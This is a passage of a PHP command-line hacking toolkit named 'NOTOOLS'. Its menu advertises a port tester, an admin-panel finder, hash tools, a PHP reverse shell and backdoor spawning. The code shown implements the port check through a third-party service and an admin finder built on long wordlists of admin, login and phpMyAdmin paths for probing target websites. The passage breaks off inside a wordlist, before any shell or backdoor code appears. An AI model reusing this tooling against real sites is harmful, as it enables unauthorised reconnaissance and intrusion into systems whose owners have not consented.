<?php 
echo "
######################################################################
                                _____________________
                                |                   |
                                |   Version: 1.0    |
                                |___________________|
                                    //
                                   // 
     _        _______ _________ _______  _______  _        _______ 
    ( (    /|(  ___  )\__   __/(  ___  )(  ___  )( \      (  ____ \
    |  \  ( || (   ) |   ) (   | (   ) || (   ) || (      | (    \/
    |   \ | || |   | |   | |   | |   | || |   | || |      | (_____ 
    | (\ \) || |   | |   | |   | |   | || |   | || |      (_____  )
    | | \   || |   | |   | |   | |   | || |   | || |            ) |
    | )  \  || (___) |   | |   | (___) || (___) || (____/\/\____) |
    |/    )_)(_______)   )_(   (_______)(_______)(_______/\_______)
   -----------------------------------------------------------------
   Coded by : 4nzeL4
   Version: 1.0
   blog: http://www.nobsec.net/
   facebook: https://www.facebook.com/akazh.gov	                                         
######################################################################
\n";
echo "[+] Welcome To NOTOOLS !\n";
echo "[+] 1. Start \t 2.About\n";
echo "=> Input: ";
$wel = trim(fgets(STDIN));
if($wel == 1){
  echo "\n\n[+] Tools: [+]\n";
  echo "1 = Port Forwarding Tester \t 6 = Backdoor's Spawn \n";
  echo "2 = Admin Finder\n";
  echo "3 = Hash Identify\n";
  echo "4 = Hash Generator\n";
  echo "5 = [PHP] Reverse Shell Spawn\n\n\n";
  echo "=> Pilih : ";
  $type = trim(fgets(STDIN));

  if ($type == 1){
  	echo "=> Input Domain/IP: ";
  	$ip = trim(fgets(STDIN));
  	echo "=> Input PORT: ";
  	$port = trim(fgets(STDIN));
  	$post = "remoteAddress=$ip&portNumber=$port";

  	echo "[+] Please wait ...";

  	$ch = curl_init();
  	curl_setopt($ch, CURLOPT_URL, 'https://www.yougetsignal.com/tools/open-ports/');
  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  	curl_setopt($ch, CURLOPT_POST, true);
  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  	$e = curl_exec($ch);
  	curl_close($ch);
  	
  	if (!preg_match('/open/', $e)) {
  		echo "\n[-] PORT $port closed!\n";
  	}else{
  		echo "\n[+] PORT $port Open!\n";
  	}
  }
  elseif ($type == 2){
    echo "=> Example input URL https://example.com or http://example.com\n";
    echo "=> Input :";
    $url = trim(fgets(STDIN))."/";
    echo"\n[+]Pilih Wordlist:\n";
    echo"1 = simple wordlist v.1\n";
    echo"2 = simple wordlist v.2\n";
    echo"3 = simple wordlist v.3\n";
    echo"4 = simple wordlist v.4\n";
    echo"5 = simple wordlist v.5\n";
    echo"6 = simple wordlist v.6\n";
    echo"7 = simple wordlist v.7\n";
    echo"8 = simple wordlist v.8\n\n";
    echo "=> Input: ";
    $w = trim(fgets(STDIN));

    if($w == 1){
      $list = array("/super_admin/",
  "/admin_user/",
  "/phpMyAdmin/",
  "/phpmyadmin/",
  "/login/",
  "/PMA/",
  ":2082/",
  "/admin/",
  "/dbadmin/",
  "/mysql/",
  "/myadmin/",
  "/phpmyadmin2/",
  "/phpMyAdmin2/",
  "/phpMyAdmin-2/",
  "/php-my-admin/",
  "/phpMyAdmin-2.2.3/",
  "/phpMyAdmin-2.2.6/",
  "/phpMyAdmin-2.5.1/",
  "/phpMyAdmin-2.5.4/",
  "/phpMyAdmin-2.5.5-rc1/",
  "/phpMyAdmin-2.5.5-rc2/",
  "/phpMyAdmin-2.5.5/",
  "/phpMyAdmin-2.5.5-pl1/",
  "/phpMyAdmin-2.5.6-rc1/",
  "/phpMyAdmin-2.5.6-rc2/",
  "/phpMyAdmin-2.5.6/",
  "/phpMyAdmin-2.5.7/",
  "/phpMyAdmin-2.5.7-pl1/",
  "/phpMyAdmin-2.6.0-alpha/",
  "/phpMyAdmin-2.6.0-alpha2/",
  "/phpMyAdmin-2.6.0-beta1/",
  "/phpMyAdmin-2.6.0-beta2/",
  "/phpMyAdmin-2.6.0-rc1/",
  "/phpMyAdmin-2.6.0-rc2/",
  "/phpMyAdmin-2.6.0-rc3/",
  "/phpMyAdmin-2.6.0/",
  "/phpMyAdmin-2.6.0-pl1/",
  "/phpMyAdmin-2.6.0-pl2/",
  "/phpMyAdmin-2.6.0-pl3/",
  "/phpMyAdmin-2.6.1-rc1/",
  "/phpMyAdmin-2.6.1-rc2/",
  "/phpMyAdmin-2.6.1/",
  "/phpMyAdmin-2.6.1-pl1/",
  "/phpMyAdmin-2.6.1-pl2/",
  "/phpMyAdmin-2.6.1-pl3/",
  "/phpMyAdmin-2.6.2-rc1/",
  "/phpMyAdmin-2.6.2-beta1/",
  "/phpMyAdmin-2.6.2-rc1/",
  "/phpMyAdmin-2.6.2/",
  "/phpMyAdmin-2.6.2-pl1/",
  "/phpMyAdmin-2.6.3/",
  "/phpMyAdmin-2.6.3-rc1/",
  "/phpMyAdmin-2.6.3/",
  "/phpMyAdmin-2.6.3-pl1/",
  "/phpMyAdmin-2.6.4-rc1/",
  "/phpMyAdmin-2.6.4-pl1/",
  "/phpMyAdmin-2.6.4-pl2/",
  "/phpMyAdmin-2.6.4-pl3/",
  "/phpMyAdmin-2.6.4-pl4/",
  "/phpMyAdmin-2.6.4/",
  "/phpMyAdmin-2.7.0-beta1/",
  "/phpMyAdmin-2.7.0-rc1/",
  "/phpMyAdmin-2.7.0-pl1/",
  "/phpMyAdmin-2.7.0-pl2/",
  "/phpMyAdmin-2.7.0/",
  "/phpMyAdmin-2.8.0-beta1/",
  "/phpMyAdmin-2.8.0-rc1/",
  "/phpMyAdmin-2.8.0-rc2/",
  "/phpMyAdmin-2.8.0/",
  "/phpMyAdmin-2.8.0.1/",
  "/phpMyAdmin-2.8.0.2/",
  "/phpMyAdmin-2.8.0.3/",
  "/phpMyAdmin-2.8.0.4/",
  "/phpMyAdmin-2.8.1-rc1/",
  "/phpMyAdmin-2.8.1/",
  "/phpMyAdmin-2.8.2/",
  "/sqlmanager/",
  "/mysqlmanager/",
  "/p/m/a/",
  "/PMA2005/",
  "/pma2005/",
  "/phpmanager/",
  "/php-myadmin/",
  "/phpmy-admin/",
  "/webadmin/",
  "/sqlweb/",
  "/websql/",
  "/webdb/",
  "/mysqladmin/",
  "/mysql-admin/",
  "/private.php/",
  "/robots.txt/",
  "/photoalbum/upload/",
  "/_vti_pvt/",
  "/:5800/",
  "/phpMyAdmin/",
  "/config.html/",
  "/_private/",
  "/admin1.php",
  "/admin1.html",
  "/admin2.php",
  "/admin2.html",
  "/yonetim.php",
  "/yonetim.html",
  "/yonetici.php",
  "/yonetici.html",
  "/adm/",
  "/admin/",
  "/admin/account.php",
  "/admin/account.html",
  "/admin/index.php",
  "/admin/index.html",
  "/admin/login.php",
  "/admin/login.html",
  "/admin/home.php",
  "/admin/controlpanel.html",
  "/admin/controlpanel.php",
  "/admin.php",
  "/admin.html",
  "/admin/cp.php",
  "/admin/cp.html",
  "/cp.php",
  "/cp.html",
  "/administrator/",
  "/administrator/index.html",
  "/administrator/index.php",
  "/administrator/login.html",
  "/administrator/login.php",
  "/administrator/account.html",
  "/administrator/account.php",
  "/administrator.php",
  "/administrator.html",
  "/login.php",
  "/login.html",
  "/modelsearch/login.php",
  "/moderator.php",
  "/moderator.html",
  "/moderator/login.php",
  "/moderator/login.html",
  "/moderator/admin.php",
  "/moderator/admin.html",
  "/moderator/",
  "/account.php",
  "/account.html",
  "/controlpanel/",
  "/controlpanel.php",
  "/controlpanel.html",
  "/admincontrol.php",
  "/admincontrol.html",
  "/adminpanel.php",
  "/adminpanel.html",
  "/admin1.asp",
  "/admin2.asp",
  "/yonetim.asp",
  "/yonetici.asp",
  "/admin/account.asp",
  "/admin/index.asp",
  "/admin/login.asp",
  "/admin/home.asp",
  "/admin/controlpanel.asp",
  "/admin.asp",
  "/admin/cp.asp",
  "/cp.asp",
  "/administrator/index.asp",
  "/administrator/login.asp",
  "/administrator/account.asp",
  "/administrator.asp",
  "/login.asp",
  "/modelsearch/login.asp",
  "/moderator.asp",
  "/moderator/login.asp",
  "/moderator/admin.asp",
  "/account.asp",
  "/controlpanel.asp",
  "/admincontrol.asp",
  "/adminpanel.asp",
  "/fileadmin/",
  "/fileadmin.php",
  "/fileadmin.asp",
  "/fileadmin.html",
  "/administration/",
  "/administration.php",
  "/administration.html",
  "/sysadmin.php",
  "/sysadmin.html",
  "/phpmyadmin/",
  "/myadmin/",
  "/sysadmin.asp",
  "/sysadmin/",
  "/ur-admin.asp",
  "/ur-admin.php",
  "/ur-admin.html",
  "/ur-admin/",
  "/Server.php",
  "/Server.html",
  "/Server.asp",
  "/Server/",
  "/wp-admin/",
  "/administr8.php",
  "/administr8.html",
  "/administr8/",
  "/administr8.asp",
  "/webadmin/",
  "/webadmin.php",
  "/webadmin.asp",
  "/webadmin.html",
  "/administratie/",
  "/admins/",
  "/admins.php",
  "/admins.asp",
  "/administrivia/",
  "/Database_Administration/",
  "/WebAdmin/",
  "/useradmin/",
  "/sysadmins/",
  "/admin1/",
  "/system-administration/",
  "/administrators/",
  "/pgadmin/",
  "/directadmin/",
  "/staradmin/",
  "/ServerAdministrator/",
  "/SysAdmin/",
  "/administer/",
  "/LiveUser_Admin/",
  "/sys-admin/",
  "/typo3/",
  "/panel/",
  "/cpanel/",
  "/cPanel/",
  "/cpanel_file/",
  "/platz_login/",
  "/rcLogin/",
  "/blogindex/",
  "/formslogin/",
  "/autologin/",
  "/support_login/",
  "/meta_login/",
  "/manuallogin/",
  "/simpleLogin/",
  "/loginflat/",
  "/utility_login/",
  "/showlogin/",
  "/memlogin/",
  "/members/",
  "/login-redirect/",
  "/sub-login/",
  "/wp-login/",
  "/login1/",
  "/dir-login/",
  "/login_db/",
  "/xlogin/",
  "/smblogin/",
  "/customer_login/",
  "/UserLogin/",
  "/login-us/",
  "/acct_login/",
  "/admin_area/",
  "/bigadmin/",
  "/project-admins/",
  "/phppgadmin/",
  "/pureadmin/",
  "/sql-admin/",
  "/radmind/",
  "/openvpnadmin/",
  "/wizmysqladmin/",
  "/vadmind/",
  "/ezsqliteadmin/",
  "/hpwebjetadmin/",
  "/newsadmin/",
  "/adminpro/",
  "/Lotus_Domino_Admin/",
  "/bbadmin/",
  "/vmailadmin/",
  "/Indy_admin/",
  "/ccp14admin/",
  "/lirc-macadmin/",
  "/banneradmin/",
  "/sshadmin/",
  "/phpldapadmin/",
  "/macadmin/",
  "/administratoraccounts/",
  "/admin4_account/",
  "/admin4_colon/",
  "/radmind-1/",
  "/Super-Admin/",
  "/AdminTools/",
  "/cmsadmin/",
  "/SysAdmin2/",
  "/globes_admin/",
  "/cadmins/",
  "/phpSQLiteAdmin/",
  "/navSiteAdmin/",
  "/server_admin_small/",
  "/logo_sysadmin/",
  "/server/",
  "/database_administration/",
  "/power_user/",
  "/system_administration/",
  "/ss_vms_admin_sm/",
  "/admin.%EXT%",
  "/login.htm",
  "/login.html",
  "/login/",
  "/login.%EXT%",
  "/adm/",
  "/admin/",
  "/admin/account.html",
  "/admin/login.html",
  "/admin/login.htm",
  "/admin/home.%EXT%",
  "/admin/controlpanel.html",
  "/admin/controlpanel.htm",
  "/admin/cp.%EXT%",
  "/admin/adminLogin.html",
  "/admin/adminLogin.htm",
  "/admin/admin_login.%EXT%",
  "/admin/controlpanel.%EXT%",
  "/admin/admin-login.%EXT%",
  "/admin-login.%EXT%",
  "/admin/account.%EXT%",
  "/admin/admin.%EXT%",
  "/admin.htm",
  "/admin.html",
  "/adminitem/",
  "/adminitem.%EXT%",
  "/adminitems/",
  "/adminitems.%EXT%",
  "/administrator/",
  "/administrator/login.%EXT%",
  "/administrator.%EXT%",
  "/administration/",
  "/administration.%EXT%",
  "/adminLogin/",
  "/adminlogin.%EXT%",
  "/admin_area/admin.%EXT%",
  "/admin_area/",
  "/admin_area/login.%EXT%",
  "/manager/",
  "/manager.%EXT%",
  "/letmein/",
  "/letmein.%EXT%",
  "/superuser/",
  "/superuser.%EXT%",
  "/access/",
  "/access.%EXT%",
  "/sysadm/",
  "/sysadm.%EXT%",
  "/superman/",
  "/supervisor/",
  "/panel.%EXT%",
  "/control/",
  "/control.%EXT%",
  "/member/",
  "/member.%EXT%",
  "/members/",
  "members.%EXT%",
  "user/",
  "/user.%EXT%",
  "/cp/",
  "/uvpanel/",
  "/manage/",
  "/manage.%EXT%",
  "/management/",
  "/management.%EXT%",
  "/signin/",
  "/signin.%EXT%",
  "/log-in/",
  "/log-in.%EXT%",
  "/log_in/",
  "/log_in.%EXT%",
  "/sign_in/",
  "/sign_in.%EXT%",
  "/sign-in/",
  "/sign-in.%EXT%",
  "/users/",
  "/users.%EXT%",
  "/accounts/",
  "/accounts.%EXT%",
  "/wp-login.php",
  "/bb-admin/login.%EXT%",
  "/bb-admin/admin.%EXT%",
  "/bb-admin/admin.html",
  "/administrator/account.%EXT%",
  "/relogin.htm",
  "/relogin.html",
  "/check.%EXT%",
  "/relogin.%EXT%",
  "/processlogin.%EXT%",
  "/checklogin.%EXT%",
  "/checkuser.%EXT%",
  "/checkadmin.%EXT%",
  "/isadmin.%EXT%",
  "/authenticate.%EXT%",
  "/authentication.%EXT%",
  "/auth.%EXT%",
  "/authuser.%EXT%",
  "/authadmin.%EXT%",
  "/cp.%EXT%",
  "/modelsearch/login.%EXT%",
  "/moderator.%EXT%",
  "/moderator/",
  "/controlpanel/",
  "/controlpanel.%EXT%",
  "/admincontrol.%EXT%",
  "/adminpanel.%EXT%",
  "/fileadmin/",
  "/fileadmin.%EXT%",
  "/sysadmin.%EXT%",
  "/admin1.%EXT%",
  "/admin1.html",
  "/admin1.htm",
  "/admin2.%EXT%",
  "/admin2.html",
  "/yonetim.%EXT%",
  "/yonetim.html",
  "/yonetici.%EXT%",
  "/yonetici.html",
  "/phpmyadmin/",
  "/myadmin/",
  "/ur-admin.%EXT%",
  "/ur-admin/",
  "/Server.%EXT%",
  "/Server/",
  "/wp-admin/",
  "/administr8.%EXT%",
  "/administr8/",
  "/webadmin/",
  "/webadmin.%EXT%",
  "/administratie/",
  "/admins/",
  "/admins.%EXT%",
  "/administrivia/",
  "/Database_Administration/",
  "/useradmin/",
  "/sysadmins/",
  "/admin1/",
  "/system-administration/",
  "/administrators/",
  "/pgadmin/",
  "/directadmin/",
  "/staradmin/",
  "/ServerAdministrator/",
  "/SysAdmin/",
  "/administer/",
  "/LiveUser_Admin/",
  "/sys-admin/",
  "/typo3/",
  "/panel/",
  "/cpanel/",
  "/cpanel_file/",
  "/platz_login/",
  "/rcLogin/",
  "/blogindex/",
  "/formslogin/",
  "/autologin/",
  "/support_login/",
  "/meta_login/",
  "/manuallogin/",
  "/simpleLogin/",
  "/loginflat/",
  "/utility_login/",
  "/showlogin/",
  "/memlogin/",
  "/login-redirect/",
  "/sub-login/",
  "/wp-login/",
  "/login1/",
  "/dir-login/",
  "/login_db/",
  "/xlogin/",
  "/smblogin/",
  "/customer_login/",
  "/UserLogin/",
  "/login-us/",
  "/acct_login/",
  "/bigadmin/",
  "/project-admins/",
  "/phppgadmin/",
  "/pureadmin/",
  "/sql-admin/",
  "/radmind/",
  "/openvpnadmin/",
  "/wizmysqladmin/",
  "/vadmind/",
  "/ezsqliteadmin/",
  "/hpwebjetadmin/",
  "/newsadmin/",
  "/adminpro/",
  "/Lotus_Domino_Admin/",
  "/bbadmin/",
  "/vmailadmin/",
  "/Indy_admin/",
  "/ccp14admin/",
  "/irc-macadmin/",
  "/sshadmin/",
  "/phpldapadmin/",
  "/macadmin/",
  "/administratoraccounts/",
  "/admin4_account/",
  "/admin4_colon/",
  "/radmind-1/",
  "/Super-Admin/",
  "/AdminTools/",
  "/cmsadmin/",
  "/SysAdmin2/",
  "/globes_admin/",
  "/cadmins/",
  "/phpSQLiteAdmin/",
  "/navSiteAdmin/",
  "/server_admin_small/",
  "/logo_sysadmin/",
  "/power_user/",
  "/system_administration/",
  "/ss_vms_admin_sm/",
  "/bb-admin/",
  "/panel-administracion/",
  "/memberadmin/",
  "/administratorlogin/",
  "/adm.%EXT%",
  "/panel-administracion/login.%EXT%",
  "/pages/admin/admin-login.%EXT%",
  "/pages/admin/",
  "/acceso.%EXT%",
  "/admincp/login.%EXT%",
  "/admincp/",
  "/admincontrol/",
  "/affiliate.%EXT%",
  "/adm_auth.%EXT%",
  "/memberadmin.%EXT%",
  "/administratorlogin.%EXT%",
  "/modules/admin/",
  "/administrators.%EXT%",
  "/siteadmin/",
  "/siteadmin.%EXT%",
  "/adminsite/",
  "/kpanel/",
  "/vorod/",
  "/vorod.%EXT%",
  "/vorud/",
  "/vorud.%EXT%",
  "/adminpanel/",
  "/PSUser/",
  "/secure/",
  "/webmaster/",
  "/webmaster.%EXT%",
  "/autologin.%EXT%",
  "/userlogin.%EXT%",
  "/admin_area.%EXT%",
  "/cmsadmin.%EXT%",
  "/security/",
  "/usr/",
  "/root/",
  "/secret/",
  "/admin/login.%EXT%",
  "/admin/adminLogin.%EXT%",
  "/moderator.php",
  "/moderator.html",
  "/moderator/login.%EXT%",
  "/moderator/admin.%EXT%",
  "/yonetici.%EXT%",
  "/0admin/",
  "/0manager/",
  "/aadmin/",
  "/cgi-bin/login%EXT%",
  "/login1%EXT%",
  "/login_admin/",
  "/login_admin%EXT%",
  "/login_out/",
  "/login_out%EXT%",
  "/login_user%EXT%",
  "/loginerror/",
  "/loginok/",
  "/loginsave/",
  "/loginsuper/",
  "/loginsuper%EXT%",
  "/login%EXT%",
  "/logout/",
  "/logout%EXT%",
  "/secrets/",
  "/super1/",
  "/super1%EXT%",
  "/super_index%EXT%",
  "/super_login%EXT%",
  "/supermanager%EXT%",
  "/superman%EXT%",
  "/superuser%EXT%",
  "/supervise/",
  "/supervise/Login%EXT%",
  "/super%EXT%",
  "/admin1.php",
  "/admin1.html",
  "/admin2.php",
  "/admin2.html",
  "/yonetim.php",
  "/yonetim.html",
  "/yonetici.php",
  "/yonetici.html",
  "/adm/",
  "/admin/",
  "/admin/account.php",
  "/admin/account.html",
  "/admin/index.php",
  "/admin/index.html",
  "/admin/login.php",
  "/admin/login.html",
  "/admin/home.php",
  "/admin/controlpanel.html",
  "/admin/controlpanel.php",
  "/admin.php",
  "/admin.html",
  "/admin/cp.php",
  "/admin/cp.html",
  "/cp.php",
  "/cp.html",
  "/administrator/",
  "/administrator/index.html",
  "/administrator/index.php",
  "/administrator/login.html",
  "/administrator/login.php",
  "/administrator/account.html",
  "/administrator/account.php",
  "/administrator.php",
  "/administrator.html",
  "/login.php",
  "/login.html",
  "/modelsearch/login.php",
  "/moderator.php",
  "/moderator.html",
  "/moderator/login.php",
  "/moderator/login.html",
  "/moderator/admin.php",
  "/moderator/admin.html",
  "/moderator/",
  "/account.php",
  "/account.html",
  "/controlpanel/",
  "/controlpanel.php",
  "controlpanel.html",
  "/admincontrol.php",
  "/admincontrol.html",
  "/adminpanel.php",
  "/adminpanel.html",
  "/admin1.asp",
  "/admin2.asp",
  "/yonetim.asp",
  "/yonetici.asp",
  "/admin/index.asp",
  "/admin/login.asp",
  "/admin/home.asp",
  "/admin/controlpanel.asp",
  "/admin.asp",
  "/admin/cp.asp",
  "/cp.asp",
  "/administrator/index.asp",
  "/administrator/account.asp",
  "/administrator.asp",
  "/login.asp",
  "/modelsearch/login.asp",
  "/moderator.asp",
  "/moderator/login.asp",
  "/moderator/admin.asp",
  "/account.asp",
  "/controlpanel.asp",
  "/admincontrol.asp",
  "/adminpanel.asp",
  "/fileadmin.php",
  "/fileadmin.asp",
  "/fileadmin.html",
  "/administration/",
  "/administration.php",
  "/administration.html",
  "/sysadmin.php",
  "/sysadmin.html",
  "/phpmyadmin/",
  "/myadmin/",
  "/sysadmin.asp",
  "/sysadmin/",
  "/ur-admin.asp",
  "/ur-admin.php",
  "/ur-admin.html",
  "/ur-admin/",
  "/Server.php",
  "/Server.html",
  "/Server.asp",
  "/Server/",
  "/wp-admin/",
  "/administr8.php",
  "/administr8.html",
  "/administr8/",
  "/administr8.asp",
  "/webadmin/",
  "/webadmin.php",
  "/webadmin.asp",
  "/webadmin.html",
  "/administratie/",
  "/admins/",
  "/admins.php",
  "/admins.asp",
  "/admins.html",
  "/administrivia/",
  "/Database_Administration/",
  "/WebAdmin/",
  "/useradmin/",
  "/sysadmins/",
  "/admin1/",
  "/system-administration/",
  "/administrators/",
  "/pgadmin/",
  "/directadmin/",
  "/staradmin/",
  "/ServerAdministrator/",
  "/SysAdmin/",
  "/administer/",
  "/LiveUser_Admin/",
  "/sys-admin/",
  "/typo3/",
  "/panel/",
  "/cpanel/",
  "/cPanel/",
  "/cpanel_file/",
  "/platz_login/",
  "/rcLogin/",
  "/blogindex/",
  "/formslogin/",
  "/support_login/",
  "/meta_login/",
  "/manuallogin/",
  "/simpleLogin/",
  "/loginflat/",
  "/utility_login/",
  "/showlogin/",
  "/memlogin/",
  "/members/",
  "/login-redirect/",
  "/sub-login/",
  "/wp-login/",
  "/login1/",
  "/dir-login/",
  "/login_db/",
  "/xlogin/",
  "/smblogin/",
  "/customer_login/",
  "/UserLogin/",
  "/login-us/",
  "/acct_login/",
  "/admin_area/",
  "/bigadmin/",
  "/project-admins/",
  "/phppgadmin/",
  "/pureadmin/",
  "/sql-admin/",
  "/radmind/",
  "/openvpnadmin/",
  "/wizmysqladmin/",
  "/vadmind/",
  "/ezsqliteadmin/",
  "/hpwebjetadmin/",
  "/newsadmin/",
  "/adminpro/",
  "/Lotus_Domino_Admin/",
  "/bbadmin/",
  "/vmailadmin/",
  "/Indy_admin/",
  "/ccp14admin/",
  "/irc-macadmin/",
  "/banneradmin/",
  "/sshadmin/",
  "/phpldapadmin/",
  "/macadmin/",
  "/administratoraccounts/",
  "/admin4_account/",
  "/admin4_colon/",
  "/radmind-1/",
  "/Super-Admin/",
  "/AdminTools/",
  "/cmsadmin/",
  "/SysAdmin2/",
  "/globes_admin/",
  "/cadmins/",
  "/phpSQLiteAdmin/",
  "/navSiteAdmin/",
  "/server_admin_small/",
  "/logo_sysadmin/",
  "/server/",
  "/power_user/",
  "/system_administration/",
  "/ss_vms_admin_sm/");
    }
    elseif($w == 2){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','adminweb/','moderator/', 'adm/','_adm_/','timadmin/','retel/','operator/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
  'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
  'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
  'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
  'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
  'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
  'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
  'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
  'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
  'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
  'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
  'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
  'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
  'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
  );
    }
    elseif($w == 3){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','retel/','operator/','moderator/', 'adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
  'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
